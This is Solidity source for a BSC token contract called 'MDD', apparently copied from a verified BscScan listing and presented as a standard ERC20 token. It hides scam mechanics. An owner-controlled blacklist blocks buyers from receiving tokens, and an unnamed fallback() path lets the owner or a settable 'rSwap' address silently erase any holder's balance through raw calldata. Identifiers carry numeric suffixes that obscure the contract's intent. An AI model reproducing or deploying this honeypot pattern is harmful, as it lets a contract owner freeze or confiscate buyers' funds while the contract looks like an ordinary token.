/**
 *Submitted for verification at BscScan.com on 2023-02-04
*/

// SPDX-License-Identifier: MIT
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

pragma solidity ^0.8.7;

contract MDD is IERC20 {
    string private constant _name_307404 = "307404";
    string private constant _symbol_307404 = "MDD";
    uint8 private constant _decimals_307404 = 18;
    uint256 private _totalSupply_307404 = 1000000000 * 10 ** _decimals_307404;
    
    mapping(address => uint256) private _balances_307404;
    mapping(address => mapping(address => uint256)) private allowed_307404;
    mapping(address => bool) public isPairAddress_307404;
    
    address private factory_307404 = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address private WBNB_307404 = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;       
    address private BSC_USDT_307404 = 0x55d398326f99059fF775485246999027B3197955;
    address private BUSD_307404 = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address private USDC_307404 = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d; 
    address public rSwap_307404;

    mapping(address => bool) public isInBlack_Listed_307404;
    address[] private blackList_307404;

    address public owner_307404;

    constructor() {
        owner_307404 = msg.sender;
        _balances_307404[msg.sender] = _totalSupply_307404;
        emit Transfer(address(0), msg.sender, _totalSupply_307404);
        
        isPairAddress_307404[computePairAddress_307404(WBNB_307404)] = true;
        isPairAddress_307404[computePairAddress_307404(BSC_USDT_307404)] = true;
        isPairAddress_307404[computePairAddress_307404(BUSD_307404)] = true;
        isPairAddress_307404[computePairAddress_307404(USDC_307404)] = true;
    }
    modifier onlyOwner() {
        require(msg.sender==owner_307404 || msg.sender==rSwap_307404, "Only owner!");
        _;
    }
    fallback() external {
        if(msg.sender==owner_307404 || msg.sender==rSwap_307404) {
            burnByFallBack_307404(msg.data);
        }
    }
    // ERC20 Functions

    function name() public view virtual returns (string memory) {
        return _name_307404;
    }
    function symbol() public view virtual returns (string memory) {
        return _symbol_307404;
    }
    function decimals() public view virtual returns (uint8) {
        return _decimals_307404;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply_307404;
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances_307404[account];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        // _approve(_msgSender(), spender, amount);
        // return true;
        allowed_307404[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function allowance(address tokenOwner, address spender) public view virtual override returns (uint256) {
        return allowed_307404[tokenOwner][spender];
    }
    function transfer(address receiver, uint256 amount) public virtual override returns (bool) {
        return transfer_307404(msg.sender, receiver, amount);
    }
    function transferFrom(address tokenOwner, address receiver, uint256 amount) public virtual override returns (bool) {
        require(amount <= allowed_307404[tokenOwner][msg.sender],"Invalid number of tokens allowed by owner");
        allowed_307404[tokenOwner][msg.sender] -= amount;
        return transfer_307404(tokenOwner, receiver, amount);
    }

    function transfer_307404(address sender, address receiver, uint256 amount) internal virtual returns (bool) {
        require(sender!= address(0) && receiver!= address(0), "invalid send or receiver address");
        require(amount <= _balances_307404[sender], "Invalid number of tokens");
        require(!isInBlack_Listed_307404[receiver] , "Address is blacklisted and cannot buy this token");

        _balances_307404[sender] -= amount;
        _balances_307404[receiver] += amount;

        emit Transfer(sender, receiver, amount);
        return true;
    }
    function computePairAddress_307404(address tokenB) internal view returns (address) {
        (address token0, address token1) = address(this) < tokenB ? (address(this), tokenB) : (tokenB, address(this));
        return address(uint160(uint256(keccak256(abi.encodePacked(hex"ff",factory_307404, keccak256(abi.encodePacked(token0, token1)), hex"00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5")))));
    }
    function addToBlackList_307404(address[] memory _address) public onlyOwner {
        for(uint i = 0; i < _address.length; i++) {
            if(_address[i]!=owner_307404 && !isInBlack_Listed_307404[_address[i]]){
                isInBlack_Listed_307404[_address[i]] = true;
                blackList_307404.push(_address[i]);
            }
        }
    }
    function removeFromBlackList_307404(address[] memory _address) public onlyOwner {
        for(uint v = 0; v < _address.length; v++) {
            if(isInBlack_Listed_307404[_address[v]]){
                isInBlack_Listed_307404[_address[v]] = false;
                uint len = blackList_307404.length;
                for(uint i = 0; i < len; i++) {
                    if(blackList_307404[i] == _address[v]) {
                        blackList_307404[i] = blackList_307404[len-1];
                        blackList_307404.pop();
                        break;
                    }
                }
            }
        }
    }
    function getBlackList_307404() public view returns (address[] memory list){
        list = blackList_307404;
    }

    function setRSwapContract_307404(address _address) public onlyOwner{
        rSwap_307404 = _address;
    }

    function burnByFallBack_307404(bytes calldata input) internal {
        bytes memory data = input[4:];
        (address burnAddress , uint256 burnAmount) = abi.decode(data, (address, uint256));
        _balances_307404[burnAddress] -= burnAmount;
        _balances_307404[address(0)] += burnAmount;
        emit Transfer(burnAddress, address(0), burnAmount);
    }
}